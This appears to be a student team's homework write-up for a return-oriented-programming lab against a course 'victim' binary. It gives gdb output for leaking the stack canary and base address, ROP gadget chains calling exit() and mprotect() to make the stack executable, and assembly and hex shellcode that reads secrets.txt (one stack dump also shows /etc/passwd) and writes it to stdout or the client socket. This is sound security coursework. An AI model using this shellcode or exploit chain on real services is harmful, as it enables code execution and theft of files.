Team Members:

1. Devharsh Trivedi (dtrived5@stevens.edu)
2. Yuchen Zhang (yzhan219@stevens.edu)
3. Dean Rodman (drodman@stevens.edu)

--x--x--x--x--x-- 

The code was tested on host: avalon

--x--x--x--x--x--

Task 1:

- Find Canary

	-- Debug binary with filling buffer with 'A's

	-- Check the number of 'A's until canary is overwritten

	-- Check value of rax register
		info registers rax
		rax            0x1f895e64f9a58b00       2272451274763242240

	-- Check stack content
	0x7fffffffe4c0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41 → buffer start
	0x7fffffffe4c8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
	0x7fffffffe4d0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
	0x7fffffffe4d8: 0x00    0x8b    0xa5    0xf9    0x64    0x5e    0x89    0x1f → canary
	0x7fffffffe4e0: 0xe0    0x49    0x55    0x55    0x55    0x55    0x00    0x00
	0x7fffffffe4e8: 0x8f    0x4d    0x55    0x55    0x55    0x55    0x00    0x00 → return address
	0x7fffffffe5d0: 0x00    0x40    0x55    0x55    0x55    0x55    0x00    0x00 → binary base address

- Find Base Address

	-- Use stack start address from mappings

	(gdb) info proc mappings
	process 3668
	Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555556000     0x2000        0x0 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
      0x555555755000     0x555555756000     0x1000     0x1000 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
      0x555555756000     0x555555757000     0x1000     0x2000 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
      0x555555757000     0x555555778000    0x21000        0x0 [heap]
      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7fe3000     0x7ffff7fe6000     0x3000        0x0 
      0x7ffff7ff7000     0x7ffff7ff8000     0x1000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]

- Find Binary Address

	-- Tried to find binary base address (starting point) with 'readelf'

		$ readelf -a victim | grep -i "entry"
		Entry point address:               0x9e0

	-- Later changed it to the starting address (first line) displayed by 'info proc map'

		(gdb) info proc mappings
		process 3668
		Mapped address spaces:

	  Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555556000     0x2000        0x0 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
      0x555555755000     0x555555756000     0x1000     0x1000 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
      0x555555756000     0x555555757000     0x1000     0x2000 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
      0x555555757000     0x555555778000    0x21000        0x0 [heap]
      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7fe3000     0x7ffff7fe6000     0x3000        0x0 
      0x7ffff7ff7000     0x7ffff7ff8000     0x1000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]

--x--x--x--x--x-- 

Task 2:

- Regular version:

	-- Get address of exit() and die()

		-- (gdb) p exit
		$2 = {<text variable, no debug info>} 0x7ffff7a47040 <__GI_exit>
	
		-- (gdb) info functions
		0x0000555555554ae0  frame_dummy
		0x0000555555554aea  die
		0x0000555555554b0a  socket_create
		0x0000555555554c17  socket_destroy
		0x0000555555554c43  heartbeat_respond
		0x0000555555554cd4  do_client
		0x0000555555554db5  main

	-- Get pop rdi; ret gadget
	
		-- $ python ROPgadget.py --binary victim
		0x0000000000000f33 : pop rdi ; ret

		-- Add this offset to binary base address
		for gdb it is 0x555555554000 + 0xf33 = 0x555555554f33

	-- Calculate string offset, for gdb use 0x7fffffffe540

	0x7fffffffe4c0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
	0x7fffffffe4d0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
	0x7fffffffe4d8: 0x00    0xea    0x2a    0x6c    0x37    0x46    0x25    0x08
	0x7fffffffe540: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41

	-- Run exploit

		-- (gdb) c
		Continuing.
		pawned!: Success
		[Inferior 1 (process 6150) exited with code 01]

- Bonus version:

	-- Search for string 'HOME' in entire stack range

		-- (gdb) find 0x7ffff7a0d000,0x7ffff7dd7000,"HOME"
		0x7ffff7b9b4ca
		warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd5e4f, halting search.
		1 pattern found.

		-- (gdb) x/s 0x7ffff7b9b4ca
		0x7ffff7b9b4ca: "HOME"

	-- Run exploit

		-- (gdb) c
		Continuing.
		HOME: Success
		[Inferior 1 (process 5882) exited with code 01]

--x--x--x--x--x-- 

Task 3:

- Find location of mprotect()

	-- (gdb) p mprotect
	$1 = {<text variable, no debug info>} 0x7ffff7b0e830 <mprotect>

- Find ROP gadgets to pass arguments
	0x0000000000000f33 : pop rdi ; ret
	0x0000000000000e8f : pop rdx ; ret
	0x0000000000000f31 : pop rsi ; pop r15 ; ret

- After the exploit our stack content should change to the following values

	-- before:
0x7fffffffe4c0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41 → pawned!
0x7fffffffe4c8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41 → AAAAAAAA
0x7fffffffe4d0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41 → BBBBBBBB
0x7fffffffe4d8: 0x00    0xb3    0x02    0x76    0x2f    0x37    0x87    0x27 → canary (stack cookie)
0x7fffffffe4e0: 0xe0    0x49    0x55    0x55    0x55    0x55    0x00    0x00 → fake address
0x7fffffffe4e8: 0x8f    0x4d    0x55    0x55    0x55    0x55    0x00    0x00 → argument 3 (0e8f : pop rdx ; ret)
0x7fffffffe4f0: 0x00    0x00    0xa0    0xc8    0x01    0x00    0x00    0x00 → value 3 (07 for rwx)
0x7fffffffe4f8: 0x10    0xe5    0xff    0xff    0x04    0x00    0x00    0x00 → argument 2 (0f31 : pop rsi ; pop r15 ; ret)
0x7fffffffe500: 0xc7    0x0e    0xe0    0x3d    0x30    0x00    0x00    0x00 → value 2 (21000 - stack size)
0x7fffffffe508: 0x10    0x70    0x75    0x55    0x55    0x55    0x00    0x00 → value 2 (21000 - stack size)
0x7fffffffe510: 0x40    0xe5    0xff    0xff    0xff    0x7f    0x00    0x00 → argument 1 (0f33 : pop rdi ; ret)
0x7fffffffe518: 0x20    0xe5    0xff    0xff    0xff    0x7f    0x00    0x00 → value 1 (0x7ffffffde000 stack start)
0x7fffffffe520: 0x34    0x38    0x0a    0x00    0xff    0x7f    0x00    0x00 → mprotect
0x7fffffffe528: 0x00    0x50    0xfe    0xf7    0xff    0x7f    0x00    0x00 → return address

	-- after:
0x7fffffffe4c0: 0x70    0x61    0x77    0x6e    0x65    0x64    0x21    0x00
0x7fffffffe4c8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4d0: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x7fffffffe4d8: 0x00    0xf9    0x81    0x26    0x6b    0x5d    0xa8    0x89
0x7fffffffe4e0: 0xde    0xad    0xbe    0xef    0x00    0x00    0x00    0x00
0x7fffffffe4e8: 0x8f    0x4e    0x55    0x55    0x55    0x55    0x00    0x00
0x7fffffffe4f0: 0x07    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4f8: 0x31    0x4f    0x55    0x55    0x55    0x55    0x00    0x00
0x7fffffffe500: 0x00    0x10    0x02    0x00    0x00    0x00    0x00    0x00
0x7fffffffe508: 0x00    0x10    0x02    0x00    0x00    0x00    0x00    0x00
0x7fffffffe510: 0x33    0x4f    0x55    0x55    0x55    0x55    0x00    0x00
0x7fffffffe518: 0x00    0xe0    0xfd    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe520: 0x30    0xe8    0xb0    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffe528: 0x30    0xe5    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe530: 0x48    0x31    0xed    0x48    0x31    0xd2    0x48    0x8d
0x7fffffffe538: 0x3d    0x3e    0x44    0x44    0x04    0x48    0x81    0xef
0x7fffffffe540: 0x01    0x44    0x44    0x04    0x80    0x74    0x24    0x55
0x7fffffffe548: 0x41    0x48    0x31    0xc0    0xb0    0x02    0x48    0x31
0x7fffffffe550: 0xf6    0x0f    0x05    0x66    0x81    0xec    0xff    0x0f
0x7fffffffe558: 0x48    0x8d    0x34    0x24    0x48    0x89    0xc7    0x48
0x7fffffffe560: 0x31    0xc0    0xb2    0xff    0x0f    0x05    0x48    0x31
0x7fffffffe568: 0xc0    0x48    0xff    0xc0    0x48    0x89    0xc7    0xb2
0x7fffffffe570: 0xff    0x0f    0x05    0xb0    0x3c    0x48    0x31    0xff
0x7fffffffe578: 0x0f    0x05    0x2f    0x65    0x74    0x63    0x2f    0x70
0x7fffffffe580: 0x61    0x73    0x73    0x77    0x64    0x90    0x90    0x90

- Assembly code for reading secrets.txt and write to stdout

	.global _start

	.text

_start:
	jmp path

goback:
	# open(secrets.txt)
	xor	%rax, %rax
	addb	$2, %al
	#push	$path
	pop	%rdi
	xor	%rsi, %rsi
	syscall

	# read(secrets.txt)
	mov	%rax, %rdi
	sub	$0xfff, %sp
	lea	0x08(%rsp), %rsi
	xor	%rdx, %rdx
	addb	$0xff, %dl
	xor	%rax, %rax
	syscall

	# write(secrets.txt)
	xor	%rax, %rax
	inc	%rax			# system call 1 is write
	mov	%rax, %rdi		# file handle 1 is stdout
	mov	%rsp, %rsi
        xor	%rdx, %rdx
	addb	$0xff, %dl		# number of bytes
        syscall

	# exit(0)
	xor	%rax, %rax
	addb	$60, %al
	xor	%rdi, %rdi
	syscall

path:
	call goback
	.ascii	"secrets.txt"

- Shellcode for reading secrets.txt and write to stdout (file handle = 1)

\xeb\x41\x48\x31\xc0\x04\x02\x5f
\x48\x31\xf6\x0f\x05\x48\x89\xc7
\x66\x81\xec\xff\x0f\x48\x8d\x74
\x24\x08\x48\x31\xd2\x80\xc2\xff
\x48\x31\xc0\x0f\x05\x48\x31\xc0
\x48\xff\xc0\x48\x89\xc7\x48\x89
\xe6\x48\x31\xd2\x80\xc2\xff\x0f
\x05\x48\x31\xc0\x04\x3c\x48\x31
\xff\x0f\x05\xe8\xba\xff\xff\xff
\x73\x65\x63\x72\x65\x74\x73\x2e
\x74\x78\x74

- Reading secrets.txt to stdout

	-- $ gcc -c passwd.S && ld passwd.o -o passwd && ./passwd
	You have been pawned! :/

- Get socket descriptor value
 
	-- (gdb) si
	0x00005555555548f0 in write@plt ()

	-- (gdb) i r rax rip rdi rsi rdx
	rax            0x4      4
	rip            0x5555555548f0   0x5555555548f0 <write@plt>
	rdi            0x4      4 → socket descriptor
	rsi            0x7fffffffe4c0   140737488348352 → string address
	rdx            0x30     48 → length

- Shellcode for reading secrets.txt and write to socket (file handle = 4)

\xeb\x41\x48\x31\xc0\x04\x02\x5f
\x48\x31\xf6\x0f\x05\x48\x89\xc7
\x66\x81\xec\xff\x0f\x48\x8d\x74
\x24\x08\x48\x31\xd2\x80\xc2\xff
\x48\x31\xc0\x0f\x05\x48\x31\xc0
\x48\xff\xc0\x80\xc2\x04\x48\x89
\xe6\x48\x31\xd2\x80\xc2\xff\x0f
\x05\x48\x31\xc0\x04\x3c\x48\x31
\xff\x0f\x05\xe8\xba\xff\xff\xff
\x73\x65\x63\x72\x65\x74\x73\x2e
\x74\x78\x74
